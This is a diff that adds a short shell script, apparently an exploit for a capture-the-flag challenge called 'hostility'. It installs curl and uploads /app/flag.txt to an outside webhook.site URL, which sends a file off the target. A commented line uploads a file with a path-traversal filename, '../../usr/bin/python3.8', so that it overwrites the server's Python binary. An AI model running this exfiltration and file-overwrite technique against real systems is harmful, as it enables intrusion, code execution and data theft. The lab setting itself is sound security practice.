@@ -1,0 +1,5 @@
+#!/bin/sh
+apt-get install curl -y
+curl "https://webhook.site/6cc46cc8-91a2-4af0-ad21-4d172e924df3" -F 'file=@/app/flag.txt'
+# curl 'https://hostility.chal.imaginaryctf.org/upload' -F 'file=@sh; filename=../../usr/bin/python3.8'
+
